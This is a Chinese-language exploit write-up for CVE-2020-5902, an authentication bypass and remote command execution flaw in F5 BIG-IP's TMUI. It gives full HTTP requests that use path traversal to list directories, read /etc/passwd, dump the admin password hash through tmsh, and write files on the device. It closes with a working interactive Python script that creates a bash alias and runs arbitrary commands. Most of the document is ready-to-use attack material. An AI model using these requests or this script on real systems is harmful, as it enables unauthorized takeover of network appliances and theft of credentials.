<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-5902）F5 BIG-IP 远程命令执行漏洞</h1><h2>一、漏洞简介</h2><p>本次漏洞位于F5 BIG-IP产品，流量管理用户页面（TMUI）存在认证绕过漏洞（CVE-2020-5902），导致可以未授权访问TMUI模块所有功能（包括未公开功能），漏洞影响范围包括执行任意系统命令、任意文件读取、任意文件写入、开启/禁用服务等。</p><h2>二、漏洞影响</h2><p>BIG-IP 15.x: 15.1.0/15.0.0<br />BIG-IP 14.x: 14.1.0 ~ 14.1.2<br />BIG-IP 13.x: 13.1.0 ~ 13.1.3<br />BIG-IP 12.x: 12.1.0 ~ 12.1.5<br />BIG-IP 11.x: 11.6.1 ~ 11.6.5</p><h2>三、复现过程</h2><h3>列当前文件</h3><p>/tmui/locallb/workspace/directoryList.jsp</p><p>Example:</p><p>directoryPath=/usr/local/www/</p><p>1.png</p><h4><em>BurpSuite Request</em></h4><p>GET /tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/ HTTP/1.1<br />Host: www.0-sec.org<br />User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br />Accept-Encoding: gzip, deflate<br />Cookie: JSESSIONID=65ACC6C79B31335D71E4F432DB39EA50<br />Connection: close<br />Upgrade-Insecure-Requests: 1</p><h4><em>BurpSuite Response</em></h4><p>      {<br />        "dir": "tmui",<br />        "children": [<br />          {<br />            "dir": "WEB-INF",<br />            "children": [<br />              {<br />                "dir": "classes",<br />                "children": [<br />                  {<br />                    "dir": "org",<br />                    "children": [<br />                      {<br />                        "dir": "apache",<br />                        "children": [<br />                          {<br />                            "dir": "jsp",<br />                            "children": [<br />                              {<br />                                "dir": "common",<br />                                "children": [<br />                                  {<br />                                    "file": "deleteconfirm_jsp.class"<br />  <br />                                      ............................</p><h3>读取当前文件</h3><p>Example:</p><p>/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</p><p>2.png</p><h4><em>BurpSuite Requests</em></h4><p>GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1<br />Host: www.0-sec.org<br />User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Upgrade-Insecure-Requests: 1</p><h4><em>BurpSuite Response</em></h4><p>{<br />  "output": "root:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\nadm:x:3:4:adm:/var/adm:/sbin/nologin\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\nuucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin\noperator:x:11:0:operator:/root:/sbin/nologin\nnobody:x:99:99:Nobody:/:/sbin/nologin\ntmshnobody:x:32765:32765:tmshnobody:/:/sbin/nologin\nadmin:x:0:500:Admin User:/home/admin:/sbin/nologin\nvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin\ndbus:x:81:81:System message bus:/:/sbin/nologin\npostgres:x:26:26:PostgreSQL Server:/var/local/pgsql/data:/sbin/nologin\nf5_remoteuser:x:499:499:f5 remote user account:/home/f5_remoteuser:/sbin/nologin\noprofile:x:16:16:Special user account to be used by OProfile:/:/sbin/nologin\ntcpdump:x:72:72::/:/sbin/nologin\nrpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin\nhsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologin\napache:x:48:48:Apache:/usr/local/www:/sbin/nologin\ntomcat:x:91:91:Apache Tomcat:/usr/share/tomcat:/sbin/nologin\nmysql:x:98:98:MySQL server:/var/lib/mysql:/sbin/nologin\nnamed:x:25:25:Named:/var/named:/bin/false\nqemu:x:107:107:qemu user:/:/sbin/nologin\nsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin\nsdm:x:498:495:sdmuser:/var/sdm:/bin/false\nntp:x:38:38::/etc/ntp:/sbin/nologin\nsyscheck:x:199:10::/:/sbin/nologin\nrestnoded:x:198:198::/:/sbin/nologin\ntwister5:x:0:500:twister5:/home/twister5:/bin/bash\n"<br />}</p><h4><em>format</em></h4><p>root:x:0:0:root:/root:/bin/bash<br />bin:x:1:1:bin:/bin:/sbin/nologin<br />daemon:x:2:2:daemon:/sbin:/sbin/nologin<br />adm:x:3:4:adm:/var/adm:/sbin/nologin<br />lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br />mail:x:8:12:mail:/var/spool/mail:/sbin/nologin<br />uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin<br />operator:x:11:0:operator:/root:/sbin/nologin<br />nobody:x:99:99:Nobody:/:/sbin/nologin<br />tmshnobody:x:32765:32765:tmshnobody:/:/sbin/nologin<br />admin:x:0:500:Admin User:/home/admin:/sbin/nologin<br />vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin<br />dbus:x:81:81:System message bus:/:/sbin/nologin<br />postgres:x:26:26:PostgreSQL Server:/var/local/pgsql/data:/sbin/nologin<br />f5_remoteuser:x:499:499:f5 remote user account:/home/f5_remoteuser:/sbin/nologin<br />oprofile:x:16:16:Special user account to be used by OProfile:/:/sbin/nologin<br />tcpdump:x:72:72::/:/sbin/nologin<br />rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin<br />hsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologin<br />apache:x:48:48:Apache:/usr/local/www:/sbin/nologin<br />tomcat:x:91:91:Apache Tomcat:/usr/share/tomcat:/sbin/nologin<br />mysql:x:98:98:MySQL server:/var/lib/mysql:/sbin/nologin<br />named:x:25:25:Named:/var/named:/bin/false<br />qemu:x:107:107:qemu user:/:/sbin/nologin<br />sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br />sdm:x:498:495:sdmuser:/var/sdm:/bin/false<br />ntp:x:38:38::/etc/ntp:/sbin/nologin<br />syscheck:x:199:10::/:/sbin/nologin<br />restnoded:x:198:198::/:/sbin/nologin<br />twister5:x:0:500:twister5:/home/twister5:/bin/bash</p><h3>远程命令执行</h3><p>Example:</p><p>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin</p><p>list auth user look all user</p><p>list auth user admin only look admin user</p><p>https://devcentral.f5.com/s/question/0D51T00006i7hq9/tmsh-command-to-list-all-users-in-all-partitions<br />3.png</p><p>GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin HTTP/1.1<br />Host: www.0-sec.org<br />User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:52.0) Gecko/20100101 Firefox/52.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Upgrade-Insecure-Requests: 1<br />{<br />  "error": "",<br />  "output": "auth user admin {\n    description \"Admin User\"\n    encrypted-password $6$bEhBobYGG3$zmQ.k2Yw4E3iOAJu1jDIrE.LClSUq6xdLyNTvgDy14FIeDsxdnwAxkxUlpSQ7F60Y3tzKsUAKz.2qRtPLa.dx1\n    partition Common\n    partition-access {\n        all-partitions {\n            role admin\n        }\n    }\n    shell tmsh\n}\n"<br />}</p><h4><em>format</em></h4><p>    description "Admin User"<br />    encrypted-password $6$bEhBobYGG3$zmQ.k2Yw4E3iOAJu1jDIrE.LClSUq6xdLyNTvgDy14FIeDsxdnwAxkxUlpSQ7F60Y3tzKsUAKz.2qRtPLa.dx1<br />    partition Common<br />    partition-access {<br />        all-partitions {<br />            role admin<br />        }<br />    }<br />    shell tmsh<br />}</p><h4><em>WorkspaceUtils.runTmshCommand</em></h4><p>JSONObject resultObject = WorkspaceUtils.runTmshCommand(cmd, request);<br />/usr/local/www/tmui/WEB-INF/lib/tmui.jar/com.f5.tmui.locallb.handler.workspace.WorkspaceUtils#runTmshCommand<br />  public static JSONObject runTmshCommand(String command, HttpServletRequest request) {<br />    F5Logger logger = (F5Logger)F5Logger.getLogger(WorkspaceUtils.class);<br />    JSONObject resultObject = new JSONObject();<br />    String output = "";<br />    String error = "";<br />    if (!csrfValidated(request.getHeader("_bufvalue"), request.getHeader("_timenow"), request.getHeader("Tmui-Dubbuf"))) {<br />      logger.warn("Invalid user token - token provided by user is not authorized");<br />      resultObject.put("output", output);<br />      resultObject.put("error", NLSEngine.getString("ilx.workspace.error.InvalidUserToken"));<br />      return resultObject;<br />    } <br />    if ("POST".equalsIgnoreCase(request.getMethod())) {<br />      String[] cmdArray = command.split(" ");<br />      String operation = cmdArray[0];<br />      String module = cmdArray[2];<br />      if (!ShellCommandValidator.checkForBadShellCharacters(command) &amp;&amp; (operation.equals("create") || operation.equals("delete") || operation.equals("list") || operation.equals("modify")) &amp;&amp; WHITELISTED_TMSH_MODULES.contains(module)) {<br />        try {<br />          String[] args = { command };<br />          Syscall.Result result = Syscall.callElevated(Syscall.TMSH, args);<br />          output = result.getOutput();<br />          error = result.getError();<br />        } catch (com.f5.tmui.util.Syscall.CallException e) {<br />          logger.error(NLSEngine.getString("ilx.workspace.error.TmshCommandFailed") + ": " + e.getMessage());<br />          error = e.getMessage();<br />        } <br />      } else {<br />        error = NLSEngine.getString("ilx.workspace.error.RejectedTmshCommand");<br />      } <br />    } else {<br />      error = NLSEngine.getString("ilx.workspace.error.InvalidMethod");<br />    } <br />    resultObject.put("output", output);<br />    resultObject.put("error", error);<br />    return resultObject;<br />  }</p><h3>文件上传</h3><p>Example: /tmui/locallb/workspace/fileSave.jsp</p><p>POST: fileName=/tmp/1.txt&amp;content=CVE-2020-5902</p><p>4.png</p><h4><em>Burpsuite Requests</em></h4><p>POST /tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp HTTP/1.1<br />Host: www.0-sec.org<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Upgrade-Insecure-Requests: 1<br />Content-Type: application/x-www-form-urlencoded<br />Content-Length: 41<br /><br />fileName=/tmp/1.txt&amp;content=CVE-2020-5902<br /><br /><br /><br />HTTP/1.1 200 OK<br />Date: Mon, 06 Jul 2020 02:05:29 GMT<br />X-Frame-Options: SAMEORIGIN<br />Strict-Transport-Security: max-age=16070400; includeSubDomains<br />Set-Cookie: JSESSIONID=x; Path=/tmui; Secure; HttpOnly<br />Content-Type: text/html;charset=ISO-8859-1<br />X-Content-Type-Options: nosniff<br />X-XSS-Protection: 1; mode=block<br />Content-Security-Policy: default-src 'self'  'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data:  http://127.4.1.1 http://127.4.2.1<br />Vary: Accept-Encoding<br />Content-Length: 4<br />Connection: close</p><h4><em>File Read /tmp/1.txt</em></h4><p>5.png</p><p>GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/1.txt HTTP/1.1<br />Host: www.0-sec.org<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br />Accept-Encoding: gzip, deflate<br />Connection: close<br />Upgrade-Insecure-Requests: 1<br />HTTP/1.1 200 OK<br />Date: Mon, 06 Jul 2020 02:06:07 GMT<br />X-Frame-Options: SAMEORIGIN<br />Strict-Transport-Security: max-age=16070400; includeSubDomains<br />Set-Cookie: JSESSIONID=x; Path=/tmui; Secure; HttpOnly<br />Content-Type: text/html;charset=ISO-8859-1<br />X-Content-Type-Options: nosniff<br />X-XSS-Protection: 1; mode=block<br />Content-Security-Policy: default-src 'self'  'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data:  http://127.4.1.1 http://127.4.2.1<br />Vary: Accept-Encoding<br />Content-Length: 32<br />Connection: close<br /><br /><br /><br /><br /><br />{"output":"CVE-2020-5902\n"}</p><h4><em>upload /tmp/1.txt Successful ！</em></h4><h3>poc</h3><p>6.png</p><p>#coding:utf-8<br />import requests<br />import json<br />import requests.packages.urllib3<br />requests.packages.urllib3.disable_warnings()<br />import uuid<br />import sys<br /><br /># tmshCmd.jsp?command=create+cli+alias+private+list+command+bash<br /># fileSave.jsp?fileName=/tmp/cmd&amp;content=id<br /># tmshCmd.jsp?command=list+/tmp/cmd<br /># tmshCmd.jsp?command=delete+cli+alias+private+list<br /><br />banner = r'''<br /> _______  _______    ______  _________ _______   _________ _______    _______  _______  _______ <br />(  ____ \(  ____ \  (  ___ \ \__   __/(  ____ \  \__   __/(  ____ )  (  ____ )(  ____ \(  ____ \<br />| (    \/| (    \/  | (   ) )   ) (   | (    \/     ) (   | (    )|  | (    )|| (    \/| (    \/<br />| (__    | (____    | (__/ /    | |   | |           | |   | (____)|  | (____)|| |      | (__    <br />|  __)   (_____ \   |  __ (     | |   | | ____      | |   |  _____)  |     __)| |      |  __)   <br />| (            ) )  | (  \ \    | |   | | \_  )     | |   | (        | (\ (   | |      | (      <br />| )      /\____) )  | )___) )___) (___| (___) |  ___) (___| )        | ) \ \__| (____/\| (____/\<br />|/       \______/   |/ \___/ \_______/(_______)  \_______/|/         |/   \__/(_______/(_______/<br />                                                                                                <br />                        CVE-2020-5902 UnAuth RCE Vuln<br />                            Python By Jas502n<br />From: https://github.com/rapid7/metasploit-framework/blob/0417e88ff24bf05b8874c953bd91600f10186ba4/modules/exploits/linux/http/f5_bigip_tmui_rce.rb<br />____________________________________________________________________________________________________________________________________________________<br />'''<br /><br />def tmshCmd_exit(url,file,cmd):<br />    tmshCmd_url = url + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash"<br />    proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}<br />    r = requests.get(tmshCmd_url,verify=False,allow_redirects=False)<br />    # r = requests.get(tmshCmd_url,verify=False,allow_redirects=False,proxies=proxies)<br /><br />    response_str = json.dumps(r.headers.__dict__['_store'])<br />    # print type(response_str)<br />    # print response_str<br />    if r.status_code == 200 and 'tmui' in response_str:<br />        # print tmshCmd_url<br />        print "[+] tmshCmd.jsp Exit!"<br />        print "[+] create cli alias private list command bash \n"<br />        # cmd = 'whoami'<br />        upload_exit(url,file,cmd)<br /><br /><br />    else:<br />        print "[+] tmshCmd.jsp No Exit!\n"<br /><br />def upload_exit(url,file,cmd):<br />    fileSave_url = url + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/%s&amp;content="%file + cmd<br />    proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}<br />    r = requests.get(fileSave_url,verify=False,allow_redirects=False)<br />    # r = requests.get(fileSave_url,verify=False,allow_redirects=False,proxies=proxies)<br />    response_str = json.dumps(r.headers.__dict__['_store'])<br />    if r.status_code == 200 and 'tmui' in response_str:<br />        # print fileSave_url<br />        print "[+] fileSave.jsp Exit!\n"<br />        list_command(url,file)<br />    else:<br />        print "[+] fileSave.jsp No Exit!\n"<br /><br />def list_command(url,file):<br />    rce_url = url + "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/%s" % file<br />    proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}<br />    r = requests.get(rce_url,verify=False,allow_redirects=False)<br />    # r = requests.get(rce_url,verify=False,allow_redirects=False,proxies=proxies)<br />    response_str = json.dumps(r.headers.__dict__['_store'])<br />    # print len(r.content)<br />    if r.status_code == 200 and 'tmui' in response_str:<br />        if len(r.content) &gt; 33:<br />            # print rce_url<br />            print "[+] Command Successfull !\n"<br />            command_result = json.loads(r.content)<br />            print &quot;_&quot;*90,'\n\n'<br />            print command_result['output']<br />            print "_"*90,"\n\n"<br />            delete_list(url)<br />    else:<br />        print "[+] Command Failed !\n"<br /><br />def delete_list(url):<br />    delete_url = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'<br />    proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}<br />    r = requests.get(delete_url,verify=False,allow_redirects=False)<br />    # r = requests.get(delete_url,verify=False,allow_redirects=False,proxies=proxies)<br />    response_str = json.dumps(r.headers.__dict__['_store'])<br />    if r.status_code == 200 and 'tmui' in response_str:<br />        # print delete_url<br />        print "[+] delete cli alias private list Successfull! \n"<br />    else:<br />        print "[+] delete cli alias private list Failed! \n"<br /><br /><br /><br /><br /><br /><br />if __name__ == '__main__':<br />    print banner<br />    while 1:<br />        url = "https://x.x.x.x/"<br />        # url = sys.argv[1]<br />        file = str(uuid.uuid1())<br />        print "/tmp/" + file,"\n"<br />        cmd = raw_input("[+]Set Cmd= ")<br />        print<br />        tmshCmd_exit(url,file,cmd)</p></body></html>